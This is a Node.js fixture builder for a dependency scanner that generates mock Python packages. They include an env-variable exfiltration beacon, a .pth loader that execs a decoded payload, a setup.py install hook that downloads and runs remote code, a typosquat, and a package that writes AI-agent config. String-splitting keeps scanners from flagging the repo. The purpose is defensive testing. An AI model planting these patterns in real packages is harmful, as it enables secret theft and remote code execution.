#!/usr/bin/env node
/**
 * Fixture builder for the Python side of `penthera deps`.
 *
 * Writes two small Python projects (base and head) with uv.lock files, an
 * installed virtualenv for head (site-packages with dist-info RECORD files),
 * a pip HTTP cache and a uv cache holding old versions for the diff, and a
 * local path dependency with a setup.py. As with build.js, every suspicious
 * string (network modules, exec of decoded payloads, AI config paths, .pth
 * import lines) is assembled here at runtime, so the repo itself does not
 * look like malware to scanners. None of the generated code is ever run.
 *
 *   node tests/fixtures/deps/build-python.js /tmp/py-demo
 *   node bin/penthera.js deps /tmp/py-demo/head
 *   PIP_CACHE_DIR=/tmp/py-demo/pip-cache UV_CACHE_DIR=/tmp/py-demo/uv-cache \
 *     node bin/penthera.js deps /tmp/py-demo/head --diff /tmp/py-demo/base/uv.lock
 */
import { mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join, dirname } from "node:path";
import { createHash } from "node:crypto";
import { crc32 } from "node:zlib";
import { fileURLToPath } from "node:url";

const j = (...p) => p.join("");
const SUBPROCESS = j("sub", "process");
const URLLIB_REQ = j("urllib", ".request");
const EXEC = j("ex", "ec");
const B64DECODE = j("base64.b64", "decode");
const ENVIRON = j("os.en", "viron");

// ── Package sources ───────────────────────────────────────────────────────

/** Deterministic pseudo-random bytes (sha256 chain). */
function prngBytes(seed, n) {
  const out = [];
  let h = Buffer.from(seed);
  while (out.length < n) {
    h = createHash("sha256").update(h).digest();
    out.push(...h);
  }
  return Buffer.from(out.slice(0, n));
}

const PACKAGES = {
  // Benign.
  "tidy-text@0.9.0": {
    "tidy_text/__init__.py": '"""Whitespace helpers."""\n\ndef tidy(s):\n    return " ".join(str(s).split())\n',
  },
  "tidy-text@1.0.0": {
    "tidy_text/__init__.py": [
      '"""Whitespace helpers.',
      "",
      "Docstrings may mention eval() or import socket without counting as code.",
      '"""',
      "import re  # re.compile is not compile()",
      "",
      "_WS = re.compile(r'\\s+')",
      "",
      "def tidy(s):",
      '    """Collapse whitespace; never calls exec()."""',
      "    return _WS.sub(' ', str(s)).strip()",
      "",
    ].join("\n"),
  },
  // Env exfil in an upgrade: 1.0.0 reads one variable, 1.1.0 posts all of them.
  "env-report@1.0.0": {
    "env_report/__init__.py": `import os\n\ndef mode():\n    return ${ENVIRON}.get("APP_MODE", "dev")\n`,
  },
  "env-report@1.1.0": {
    "env_report/__init__.py": [
      "import os",
      "import json",
      `import ${URLLIB_REQ}`,
      "",
      "def mode():",
      `    return ${ENVIRON}.get("APP_MODE", "dev")`,
      "",
      "def _beacon():",
      `    body = json.dumps(dict(${ENVIRON})).encode()`,
      `    req = ${URLLIB_REQ}.Request("https://collector.invalid/c", data=body)`,
      `    ${URLLIB_REQ}.urlopen(req, timeout=2)`,
      "",
    ].join("\n"),
  },
  // .pth persistence: the .pth imports a boot module that decodes and runs a payload.
  "pth-loader@0.1.0": {
    "pth_loader.pth": `${j("im", "port")} pth_loader_boot\n`,
    "pth_loader_boot.py": [
      "import base64",
      `import ${URLLIB_REQ}`,
      `_P = "${prngBytes("penthera-pth", 300).toString("base64")}"`,
      "def _go():",
      `    ${EXEC}(${B64DECODE}(_P))`,
      `    ${URLLIB_REQ}.urlopen("https://collector.invalid/p", timeout=2)`,
      "_go()",
      "",
    ].join("\n"),
    "pth_loader/__init__.py": "VERSION = '0.1.0'\n",
  },
  // A typosquat of requests.
  "reqeusts@2.0.0": {
    "reqeusts/__init__.py": "def get(url):\n    return None\n",
  },
  // Writes AI agent config into the home directory.
  "agent-helper@0.2.0": {
    "agent_helper/__init__.py": [
      "from pathlib import Path",
      "import json",
      "def install():",
      `    target = Path.home() / "${j(".cl", "aude")}" / "settings.json"`,
      "    target.parent.mkdir(exist_ok=True)",
      "    target.write_text(json.dumps({'hooks': {}}))",
      "",
    ].join("\n"),
  },
  // Native extension: ships a .so.
  "fast-hash@3.0.0": {
    "fast_hash/__init__.py": "from ._impl import digest\n",
    "fast_hash/_impl.cpython-312-darwin.so": "\x7fELF-not-really\n",
  },
  // Same capabilities in both versions; old copy lives in uv's cache.
  "slow-math@1.0.0": {
    "slow_math/__init__.py": "def add(a, b):\n    return a + b\n",
  },
  "slow-math@1.1.0": {
    "slow_math/__init__.py": `import ${SUBPROCESS}\n\ndef add(a, b):\n    return a + b\n\ndef cpu():\n    return ${SUBPROCESS}.run(["uname", "-m"], capture_output=True).stdout\n`,
  },
};

/** A local path dependency whose setup.py downloads and runs code at install. */
function setupDownloader() {
  return {
    "setup.py": [
      "from setuptools import setup",
      "from setuptools.command.install import install",
      `import ${URLLIB_REQ}`,
      "",
      "class PostInstall(install):",
      "    def run(self):",
      "        install.run(self)",
      `        code = ${URLLIB_REQ}.urlopen("https://collector.invalid/stage2.py").read()`,
      `        ${EXEC}(code)`,
      "",
      "setup(name='fetch-helper', version='0.3.0', packages=['fetch_helper'], cmdclass={'install': PostInstall})",
      "",
    ].join("\n"),
    "fetch_helper/__init__.py": "def fetch():\n    return None\n",
  };
}

// ── Writers ───────────────────────────────────────────────────────────────

const recordHash = (bytes) => `sha256=${createHash("sha256").update(bytes).digest("base64url")}`;
const sha256 = (bytes) => createHash("sha256").update(bytes).digest("hex");
const distName = (name) => name.replace(/-/g, "_");

function write(path, data) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, data);
}

/** Files of an installed distribution, including its dist-info. */
function distFiles(name, version, files) {
  const info = `${distName(name)}-${version}.dist-info`;
  const out = { ...files };
  out[`${info}/METADATA`] = `Metadata-Version: 2.1\nName: ${name}\nVersion: ${version}\n\n`;
  out[`${info}/WHEEL`] = "Wheel-Version: 1.0\nGenerator: penthera-fixture\nRoot-Is-Purelib: true\nTag: py3-none-any\n";
  const record = Object.entries(out).map(([p, c]) => `${p},${recordHash(Buffer.from(c))},${Buffer.byteLength(c)}`);
  record.push(`${info}/RECORD,,`);
  out[`${info}/RECORD`] = record.join("\n") + "\n";
  return out;
}

/** A stored (uncompressed) zip: enough for a wheel. */
function zip(files) {
  const locals = [];
  const centrals = [];
  let off = 0;
  for (const [name, content] of Object.entries(files).sort()) {
    const data = Buffer.from(content);
    const nameBuf = Buffer.from(name);
    const crc = crc32(data);
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt32LE(crc, 14);
    lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(nameBuf.length, 26);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt32LE(crc, 16);
    ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(nameBuf.length, 28);
    ch.writeUInt32LE(off, 42);
    locals.push(lh, nameBuf, data);
    centrals.push(ch, nameBuf);
    off += 30 + nameBuf.length + data.length;
  }
  const cd = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(centrals.length / 2, 8); end.writeUInt16LE(centrals.length / 2, 10);
  end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...locals, cd, end]);
}

function wheel(key) {
  const [name, version] = key.split("@");
  return zip(distFiles(name, version, PACKAGES[key]));
}

/** uv.lock text for a project and its packages. */
function uvLock(project, entries) {
  const L = ["version = 1", "revision = 3", 'requires-python = ">=3.12"', ""];
  for (const e of entries) {
    L.push("[[package]]", `name = "${e.name}"`, `version = "${e.version}"`);
    if (e.directory) {
      L.push(`source = { directory = "${e.directory}" }`);
    } else {
      L.push('source = { registry = "https://pypi.org/simple" }');
      const file = `${distName(e.name)}-${e.version}-py3-none-any.whl`;
      L.push("wheels = [", `    { url = "https://files.pythonhosted.org/packages/00/00/${e.hash.slice(0, 32)}/${file}", hash = "sha256:${e.hash}", size = ${e.size} },`, "]");
    }
    L.push("");
  }
  L.push("[[package]]", `name = "${project}"`, 'version = "0.1.0"', 'source = { virtual = "." }', "dependencies = [");
  for (const e of entries) L.push(`    { name = "${e.name}" },`);
  L.push("]", "");
  return L.join("\n");
}

/** A uv cache entry: archive pointer (msgpack) plus the unpacked wheel. */
function writeUvCache(dir, key, bytes) {
  const [name, version] = key.split("@");
  const id = `fixture${sha256(bytes).slice(0, 12)}`;
  const files = distFiles(name, version, PACKAGES[key]);
  for (const [p, c] of Object.entries(files)) write(join(dir, "archive-v0", id, p), c);
  const filename = `${distName(name)}-${version}-py3-none-any.whl`;
  const str = (s) => {
    const b = Buffer.from(s);
    return b.length < 32 ? Buffer.concat([Buffer.from([0xa0 | b.length]), b]) : Buffer.concat([Buffer.from([0xd9, b.length]), b]);
  };
  const pointer = Buffer.concat([Buffer.from([0x94]), str(id), Buffer.from([0x91]), str(`sha256:${sha256(bytes)}`), str(filename), Buffer.from([0x00])]);
  write(join(dir, "wheels-v6", "pypi", name, `${version}-py3-none-any.http`), pointer);
}

/**
 * Build the fixture tree under `root`.
 * @returns {{ base, head, venv, pipCache, uvCache }}
 */
export function buildPythonFixtures(root) {
  rmSync(root, { recursive: true, force: true });
  const base = join(root, "base");
  const head = join(root, "head");
  const pipCache = join(root, "pip-cache");
  const uvCache = join(root, "uv-cache");
  const wheels = Object.fromEntries(Object.keys(PACKAGES).map((k) => [k, wheel(k)]));
  const entry = (key) => {
    const [name, version] = key.split("@");
    return { name, version, hash: sha256(wheels[key]), size: wheels[key].length };
  };

  // Base: older versions, no venv (old copies come from the caches).
  write(join(base, "pyproject.toml"), '[project]\nname = "demo"\nversion = "0.1.0"\n');
  write(join(base, "uv.lock"), uvLock("demo", ["env-report@1.0.0", "slow-math@1.0.0", "tidy-text@0.9.0"].map(entry)));

  // Head: upgrades, new packages, a local setup.py dependency, an installed venv.
  const headKeys = ["agent-helper@0.2.0", "env-report@1.1.0", "fast-hash@3.0.0", "pth-loader@0.1.0", "reqeusts@2.0.0", "slow-math@1.1.0", "tidy-text@1.0.0"];
  write(join(head, "pyproject.toml"), '[project]\nname = "demo"\nversion = "0.1.0"\n');
  for (const [p, c] of Object.entries(setupDownloader())) write(join(head, "vendor", "fetch-helper", p), c);
  write(join(head, "uv.lock"), uvLock("demo", [...headKeys.map(entry), { name: "fetch-helper", version: "0.3.0", directory: "vendor/fetch-helper" }]
    .sort((a, b) => a.name.localeCompare(b.name))));

  const venv = join(head, ".venv");
  const site = join(venv, "lib", "python3.12", "site-packages");
  write(join(venv, "pyvenv.cfg"), "home = /usr/bin\nversion = 3.12.0\n");
  for (const key of headKeys) {
    const [name, version] = key.split("@");
    for (const [p, c] of Object.entries(distFiles(name, version, PACKAGES[key]))) write(join(site, p), c);
  }
  // Tampered after install: tidy_text no longer matches its RECORD.
  write(join(site, "tidy_text", "__init__.py"), `${PACKAGES["tidy-text@1.0.0"]["tidy_text/__init__.py"]}\n# patched\n`);
  // A .pth no distribution owns, dropped into site-packages.
  write(join(site, "zz_sitecustom.pth"), `${j("im", "port")} os; ${EXEC}(${j("bytes.from", "hex")}('7072696e74282229'))\n`);

  // Old versions in the caches: env-report 1.0.0 in pip's, slow-math 1.0.0 in uv's.
  write(join(pipCache, "http-v2", "a", "b", "c", "d", "e", `${"ab".repeat(28)}.body`), wheels["env-report@1.0.0"]);
  writeUvCache(uvCache, "slow-math@1.0.0", wheels["slow-math@1.0.0"]);

  // requirements.txt variant of head, hashed, for the requirements parser.
  write(join(root, "req", "requirements.txt"), headKeys.map((k) => {
    const e = entry(k);
    return `${e.name}==${e.version} \\\n    --hash=sha256:${e.hash}`;
  }).join("\n") + "\n");
  return { base, head, venv, pipCache, uvCache };
}

if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
  const out = process.argv[2];
  if (!out) {
    console.error("usage: build-python.js <dir>");
    process.exit(2);
  }
  const r = buildPythonFixtures(out);
  console.log(JSON.stringify(r, null, 2));
}
